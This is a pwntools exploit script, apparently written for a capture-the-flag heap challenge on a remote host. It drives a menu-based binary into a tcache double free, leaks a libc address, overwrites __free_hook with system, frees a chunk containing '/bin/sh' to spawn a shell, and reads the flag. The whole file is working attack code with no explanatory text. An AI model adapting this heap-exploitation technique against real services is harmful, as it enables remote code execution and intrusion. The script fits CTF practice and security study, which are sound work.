#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './chall'
TARGET = ('34.92.96.238', 10001)

if args.E: # or args.R:
    LIBC64 = './lib/libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process('./pwn')
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def addx(size, name, call):
    r.sendlineafter('Input your choice:', '1')
    r.sendlineafter('Please input the size of girl\'s name\n', str(size))
    r.sendlineafter('please inpute her name:\n', name)
    r.sendlineafter('please input her call:', call)

def show(idx):
    r.sendlineafter('Input your choice:', '2')
    r.sendlineafter('Please input the index:', str(idx))

def edit(idx):
    r.sendlineafter('Input your choice:', '3')

def call(idx):
    r.sendlineafter('Input your choice:', '4')
    r.sendlineafter('Please input the index:', str(idx))

code = ELF(BINARY)
libc = ELF(LIBC64)
#attach(0xce9)

for i in xrange(7):
    addx(0x20, 'a'*0x10, '1'*11)
addx(0x20, 'a'*0x10, '2'*11)
addx(0x20, 'a'*0x10, '3'*11)
addx(0x20, 'a'*0x10, 'x'*11)

for i in xrange(7):
    call(i)

call(7)
call(8)
call(7)

#edit(0)
#show(7)
#r.recvuntil('name:\n')
#heap = u64(r.recv(6)+'\x00\x00') - 0x4f0
#log.info('heap address %#x' % heap)


for i in xrange(7):
    addx(0x100, 'a'*0x10, '1'*11)
addx(0x100, 'b'*0x10, '2'*11)
addx(0x100, 'b'*0x10, '2'*11)
addx(0x100, 'b'*0x10, '2'*11)

for i in xrange(8):
    call(i+10)
edit(0)
show(17)
r.recvuntil('name:\n')
libc.address = u64(r.recv(6)+'\x00\x00') - 0x3b1ca0
log.info('libc address %#x' % libc.address)

for i in xrange(7):
    addx(0x20, 'a'*0x10, '1'*11)

addx(0x20, p64(libc.sym['__free_hook']), '1'*11)
addx(0x20, '/bin/sh\x00', '1'*11)
addx(0x20, '/bin/sh\x00', '1'*11)
addx(0x20, p64(libc.sym['system']), '1'*11)

call(29)
r.sendline('cat ./flag')

r.interactive()
